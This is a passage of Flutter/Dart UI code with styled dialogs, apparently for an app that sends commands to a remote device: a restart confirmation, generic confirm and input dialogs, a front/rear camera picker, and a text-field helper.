            const Text('RESTART', style: TextStyle(color: AppTheme.silverGlow, fontSize: 15, fontWeight: FontWeight.w700)),
          ],
        ),
        content: const Text(
          'Device will be restarted.\n Make sure target is safe.',
          style: TextStyle(color: AppTheme.silverLight, fontSize: 13, height: 1.5),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Cancel', style: TextStyle(color: AppTheme.silverLight)),
          ),
          Container(
            decoration: BoxDecoration(
              gradient: AppTheme.gradientSilver,
              borderRadius: BorderRadius.circular(12),
              boxShadow: [AppTheme.glowSilverIntense],
            ),
            child: ElevatedButton(
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.transparent,
                shadowColor: Colors.transparent,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
              ),
              onPressed: () {
                Navigator.pop(context);
                _sendCommand('reboot_device');
                _showToast('Restarting device...', color: AppTheme.silverGlow);
              },
              child: const Text('RESTART', style: TextStyle(color: AppTheme.silverDarkBg, fontWeight: FontWeight.bold)),
            ),
          ),
        ],
      ),
    );
  }

  void _showConfirmDialog(String title, String message, VoidCallback onConfirm) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: AppTheme.silverDarkBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: AppTheme.silverGlow.withOpacity(0.3)),
        ),
        title: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                gradient: AppTheme.gradientSilver,
                borderRadius: BorderRadius.circular(12),
                boxShadow: [AppTheme.glowSilver],
              ),
              child: const Icon(Icons.warning_rounded, color: AppTheme.silverDarkBg, size: 18),
            ),
            const SizedBox(width: 12),
            Text(title, style: const TextStyle(color: AppTheme.silverGlow, fontSize: 15, fontWeight: FontWeight.w700)),
          ],
        ),
        content: Text(message, style: const TextStyle(color: AppTheme.silverLight, fontSize: 13)),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Cancel', style: TextStyle(color: AppTheme.silverLight)),
          ),
          Container(
            decoration: BoxDecoration(
              gradient: AppTheme.gradientSilver,
              borderRadius: BorderRadius.circular(12),
              boxShadow: [AppTheme.glowSilverIntense],
            ),
            child: ElevatedButton(
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.transparent,
                shadowColor: Colors.transparent,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
              ),
              onPressed: () {
                Navigator.pop(context);
                onConfirm();
              },
              child: const Text('CONFIRM', style: TextStyle(color: AppTheme.silverDarkBg, fontWeight: FontWeight.bold)),
            ),
          ),
        ],
      ),
    );
  }

  void _showInputDialog(String title, String label, Function(String) onConfirm, {String hint = ''}) {
    final controller = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: AppTheme.silverDarkBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: AppTheme.silverGlow.withOpacity(0.3)),
        ),
        title: Text(title, style: const TextStyle(color: AppTheme.silverGlow, fontSize: 15, fontWeight: FontWeight.w700)),
        content: _buildInputField(controller, label, hint: hint),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Cancel', style: TextStyle(color: AppTheme.silverLight)),
          ),
          Container(
            decoration: BoxDecoration(
              gradient: AppTheme.gradientSilver,
              borderRadius: BorderRadius.circular(12),
              boxShadow: [AppTheme.glowSilverIntense],
            ),
            child: ElevatedButton(
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.transparent,
                shadowColor: Colors.transparent,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
              ),
              onPressed: () {
                Navigator.pop(context);
                onConfirm(controller.text.trim());
              },
              child: const Text('SEND', style: TextStyle(color: AppTheme.silverDarkBg, fontWeight: FontWeight.bold)),
            ),
          ),
        ],
      ),
    );
  }

  void _showCameraPicker(Function(String) onPick) {
    String selected = 'back';
    showDialog(
      context: context,
      builder: (_) => StatefulBuilder(
        builder: (ctx, setState) => AlertDialog(
          backgroundColor: AppTheme.silverDarkBg,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: AppTheme.silverGlow.withOpacity(0.3)),
          ),
          title: const Text('Select Camera', style: TextStyle(color: AppTheme.silverGlow, fontSize: 14, fontWeight: FontWeight.bold)),
          content: Row(
            mainAxisAlignment: MainAxisAlignment.spaceEvenly,
            children: ['back', 'front'].map((side) {
              final isSelected = selected == side;
              return GestureDetector(
                onTap: () => setState(() => selected = side),
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 16),
                  decoration: BoxDecoration(
                    gradient: isSelected ? AppTheme.gradientSilverDark : null,
                    color: isSelected ? null : Colors.transparent,
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(color: isSelected ? AppTheme.silverGlow : AppTheme.silverBorder),
                    boxShadow: isSelected ? [
                      BoxShadow(
                        color: AppTheme.silverGlow.withOpacity(0.2),
                        blurRadius: 20,
                        spreadRadius: 3,
                      ),
                    ] : null,
                  ),
                  child: Column(
                    children: [
                      Icon(
                        side == 'back' ? Icons.camera_rear_rounded : Icons.camera_front_rounded,
                        color: isSelected ? AppTheme.silverGlow : AppTheme.silverLight,
                        size: 32,
                      ),
                      const SizedBox(height: 6),
                      Text(
                        side == 'back' ? 'Rear' : 'Front',
                        style: TextStyle(
                          color: isSelected ? AppTheme.silverGlow : AppTheme.silverLight,
                          fontSize: 11,
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                    ],
                  ),
                ),
              );
            }).toList(),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(ctx),
              child: const Text('Cancel', style: TextStyle(color: AppTheme.silverLight)),
            ),
            Container(
              decoration: BoxDecoration(
                gradient: AppTheme.gradientSilver,
                borderRadius: BorderRadius.circular(12),
                boxShadow: [AppTheme.glowSilverIntense],
              ),
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.transparent,
                  shadowColor: Colors.transparent,
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                ),
                onPressed: () {
                  Navigator.pop(ctx);
                  onPick(selected);
                },
                child: const Text('SELECT', style: TextStyle(color: AppTheme.silverDarkBg, fontWeight: FontWeight.bold)),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildInputField(TextEditingController controller, String label, {String hint = '', bool isNumber = false}) {
    return TextField(
      controller: controller,
      keyboardType: isNumber ? TextInputType.number : TextInputType.text,
      style: const TextStyle(color: AppTheme.textPrimary, fontSize: 13),
      decoration: InputDecoration(
        labelText: label,
        hintText: hint,
        labelStyle: const TextStyle(color: AppTheme.silverLight, fontSize: 12),
        hintStyle: const TextStyle(color: AppTheme.silverLight, fontSize: 12),
        filled: true,
        fillColor: AppTheme.background,
        contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
        border: OutlineInputBorder(
          borderRadius: BorderRadius.circular(12),
          borderSide: const BorderSide(color: AppTheme.silverBorder),
        ),
        enabledBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(12),
          borderSide: const BorderSide(color: AppTheme.silverBorder),
        ),
        focusedBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(12),
          borderSide: const BorderSide(color: AppTheme.silverGlow, width: 2),
        ),
      ),
    );
  }
}